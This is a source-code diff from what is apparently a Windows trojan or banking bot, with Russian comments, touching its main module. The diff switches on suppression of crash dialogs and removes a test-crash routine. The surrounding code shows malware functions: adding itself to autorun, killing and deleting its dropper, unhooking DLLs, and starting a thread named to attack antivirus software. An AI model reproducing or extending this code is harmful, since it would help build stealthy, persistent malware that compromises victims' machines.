@@ -23,7 +23,7 @@
 
 #include "Modules.h"
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
 
 //********************** Отладочные шаблоны **********************************
@@ -86,6 +86,7 @@ void InternalAddToAutorun()
 
 void DeleteDropper() // убиваем процесс, стираем файл
 {
+	
 	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
 	{
 		MDBG("Main", "Удаляем дропер");
@@ -173,12 +174,11 @@ void ExplorerMain()
 {
 	MDBG("Main", "----------------- ExplorerMain -----------------");
 	
-
 	if ( !dwExplorerSelf )
 		UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
-	//DisableShowFatalErrorDialog();
+	DisableShowFatalErrorDialog();
 
 	InternalAddToAutorun();
 
@@ -203,10 +203,11 @@ void ExplorerMain()
 	MegaJump(AvFuckThread);
 
 
-	// Вызываем событие старта експлорера
+	// Вызываем событие мтарта експлорера
 
 	if (dwFirst)
 		ExplorerFirstStart(NULL);
+
 	ExplorerStart(NULL);
 
 }
@@ -237,22 +238,12 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 	return 0;
 }
 
-void CreateTestException()
-{
-	// делаем падение в ntdll.dll
-	//pHeapFree(0x27238762, 0, (void*)0x76183617);
-
-	// делаем падение в нашем модуле
-	//char* p = NULL;
-	//*p = 1;
-}
 
 int APIENTRY MyMain() 
 {
 
 	BOT::Initialize();
 
-	CreateTestException();
 
 	#if defined(DEBUGBOT) && defined(DebugUtils)
 		if (!StartInDebugingMode(true))
